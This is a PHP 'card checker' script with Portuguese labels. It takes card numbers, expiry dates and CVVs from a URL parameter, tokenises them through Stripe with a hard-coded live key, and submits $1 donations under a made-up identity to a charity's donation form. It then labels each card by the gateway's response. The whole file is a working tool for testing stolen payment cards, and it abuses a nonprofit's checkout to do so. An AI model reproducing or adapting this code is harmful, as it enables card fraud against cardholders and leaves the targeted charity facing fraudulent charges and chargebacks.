<?php
error_reporting(0);

function Zellyon($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.stripe.com',
'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',
'Accept: application/json',
'Content-Type: application/x-www-form-urlencoded',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.thearclaoc.org&stripe_xdm_c=default788271&stripe_xdm_p=1',
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=201216&pasted_fields=number&guid=a91b76be-9579-4ca6-b398-3303111ad82f&muid=1647f87e-98cd-472a-a27c-93282b922b7e&sid=d46345cf-d29d-443f-af91-27e0d405318e&key=pk_live_TsBPQcOuiZkhApuSYHqYgR4f&payment_user_agent=stripe.js%2Fa44017d&card[number]='.$cc.'&card[name]=carlos+monteiro&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]=street+27x&card[address_line2]=&card[address_city]=new+york&card[address_state]=NY&card[address_zip]=10080&card[address_country]=US');
$pagamento = curl_exec($ch);

$token = Zellyon($pagamento,'"id": "','"');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.thearclaoc.org/dollars-a-day-donation/?payment-mode=stripe');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: https://www.thearclaoc.org/',
'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Content-Type:application/x-www-form-urlencoded',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Referer: https://www.thearclaoc.org/dollars-a-day-donation/?payment-mode=stripe',
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'give-honeypot=&give-form-id-prefix=1742-1&give-form-id=1742&give-form-title=DOLLARS+A+DAY+DONATION&give-current-url=https%3A%2F%2Fwww.thearclaoc.org%2Fdollars-a-day-donation%2F&give-form-url=https%3A%2F%2Fwww.thearclaoc.org%2Fdollars-a-day-donation%2F&give-form-minimum=&give-form-maximum=999999.99&give-form-hash=bb492a2e43&give-amount=1&payment-mode=stripe&give_first=carlos&give_last=silva&give_email=carlos897%40gmail.com&phone_number_=312183960&comment=&billing_country=US&card_address=street+27x&card_address_2=&card_city=new+york&card_state=NY&card_zip=10080&give_action=purchase&give-gateway=stripe&give_stripe_token=tok_1GDxB2JEcammq1GYjR089IMq&give_stripe_token=tok_1GDxCdJEcammq1GYcs12PMed');
echo$pagamento = curl_exec($ch);

if (strpos($pagamento, "Your card's security code is incorrect.")){



echo "<b style='font-size:16px;'> <font style='color:yellow;'>$cc|$mes|$ano|$cvv|<font style='color: #09FE05 ;'>Cvv2-Declined</font></b>";
      }else{
       
echo "<b style='font-size:16px;' > <font style='color:red;'> $cc|$mes|$ano|$cvv|<font style='color: #FF0000 ;'>REPROVADA</font</font>";
      }


?>